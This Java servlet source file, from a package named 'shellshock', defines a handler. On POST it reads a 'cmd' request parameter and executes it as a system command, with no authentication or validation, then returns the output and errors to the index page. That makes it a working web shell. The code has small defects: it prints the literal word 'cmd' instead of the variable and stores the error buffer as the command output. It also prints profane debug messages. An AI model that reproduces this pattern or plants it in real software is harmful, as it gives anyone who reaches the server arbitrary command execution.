package com.shellshock.servlet;

import com.shellshock.CommandLine;
import com.shellshock.ProcessOutput;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class CommandLineServlet extends ShellshockServlet {

    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException {
        System.out.println("AAAAAAAAAAAAAAAAARGH");
        String cmd = request.getParameter("cmd");
        System.out.println("cmd");
        if (cmd != null){
            ProcessOutput output = CommandLine.instance().executeCommand(cmd);
            if (output != null){
                StringBuffer out = new StringBuffer();
                StringBuffer errs = new StringBuffer();
                for (String line: output.getOutput()){
                    out.append(line).append("\n");
                }
                for (String err: output.getErrors()){
                    errs.append(err).append("\n");
                }
                if (out.length() > 0){
                    request.setAttribute("commandOutput", errs);
                }
                if (errs.length() > 0){
                    request.setAttribute("commandError", errs);
                }
            }
        }
        request.getRequestDispatcher(INDEX).forward(request, response);
    }

    @Override
    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException {
        System.out.println("FUCKOFFFFFFFf");
        request.getRequestDispatcher(INDEX).forward(request, response);

    }

}
